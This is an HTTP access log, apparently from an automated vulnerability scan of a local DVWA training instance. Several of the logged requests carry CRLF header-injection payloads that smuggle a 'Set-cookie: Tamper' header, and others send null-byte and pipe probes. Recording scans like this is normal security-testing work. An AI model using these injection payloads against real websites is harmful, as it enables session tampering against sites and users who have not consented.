172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php?query=any%3F%0ASet-cookie%3A+Tamper%3D4617a9c1-3fc3-47af-90ad-c152b776f479 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /setup.php?query=any%3F%0ASet-cookie%3A+Tamper%3D549744f4-73a9-4eb1-bfae-6bd60f349710 HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php?query=any%0D%0ASet-cookie%3A+Tamper%3D4617a9c1-3fc3-47af-90ad-c152b776f479%0D%0A HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /setup.php?query=any%0D%0ASet-cookie%3A+Tamper%3D549744f4-73a9-4eb1-bfae-6bd60f349710%0D%0A HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D4617a9c1-3fc3-47af-90ad-c152b776f479%0D%0A HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /setup.php?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D549744f4-73a9-4eb1-bfae-6bd60f349710%0D%0A HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /sitemap.xml?query=Set-cookie%3A+Tamper%3D54a3954a-121c-46cc-a6aa-2e9349d96edc HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /sitemap.xml?query=any%0D%0ASet-cookie%3A+Tamper%3D54a3954a-121c-46cc-a6aa-2e9349d96edc HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /sitemap.xml?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D54a3954a-121c-46cc-a6aa-2e9349d96edc HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /sitemap.xml?query=any%0ASet-cookie%3A+Tamper%3D54a3954a-121c-46cc-a6aa-2e9349d96edc HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /sitemap.xml?query=any%3F%0ASet-cookie%3A+Tamper%3D54a3954a-121c-46cc-a6aa-2e9349d96edc HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /sitemap.xml?query=any%0D%0ASet-cookie%3A+Tamper%3D54a3954a-121c-46cc-a6aa-2e9349d96edc%0D%0A HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /sitemap.xml?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D54a3954a-121c-46cc-a6aa-2e9349d96edc%0D%0A HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET / HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /about.php HTTP/1.1" 200 5843 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /?= HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /about.php?= HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /?query= HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /about.php?query= HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /?query=%40 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /about.php?query=%40 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /?query=%2B HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /about.php?query=%2B HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /?query=%00 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /about.php?query=%00 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /?query=%7C HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /about.php?query=%7C HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs/ HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs/DVWA_v1.3.pdf HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs?= HTTP/1.1" 301 524 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs/?= HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs?query= HTTP/1.1" 301 534 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs/DVWA_v1.3.pdf?= HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs/?query= HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs?query=%40 HTTP/1.1" 301 559 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs/?query=%40 HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs?query=%2B HTTP/1.1" 301 540 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs/?query=%2B HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs?query=%00 HTTP/1.1" 301 540 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs/?query=%00 HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs?query=%7C HTTP/1.1" 301 540 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs/?query=%7C HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs/DVWA_v1.3.pdf?query= HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs/DVWA_v1.3.pdf?query=%40 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs/DVWA_v1.3.pdf?query=%2B HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/ HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa?= HTTP/1.1" 301 524 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/?= HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa?query= HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/?query= HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa?query=%40 HTTP/1.1" 301 540 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/?query=%40 HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa?query=%2B HTTP/1.1" 301 540 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs/DVWA_v1.3.pdf?query=%00 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/?query=%2B HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa?query=%00 HTTP/1.1" 301 540 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/?query=%00 HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa?query=%7C HTTP/1.1" 301 540 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/?query=%7C HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /docs/DVWA_v1.3.pdf?query=%7C HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/login.css HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/ HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css?= HTTP/1.1" 301 532 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/?= HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/login.css?= HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css?query= HTTP/1.1" 301 542 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/?query= HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/login.css?query= HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css?query=%40 HTTP/1.1" 301 548 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/login.css?query=%40 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/?query=%40 HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/login.css?query=%2B HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css?query=%2B HTTP/1.1" 301 548 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/login.css?query=%00 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/?query=%2B HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/login.css?query=%7C HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css?query=%00 HTTP/1.1" 301 548 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/?query=%00 HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css?query=%7C HTTP/1.1" 301 548 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/?query=%7C HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/main.css HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/ HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/main.css?= HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
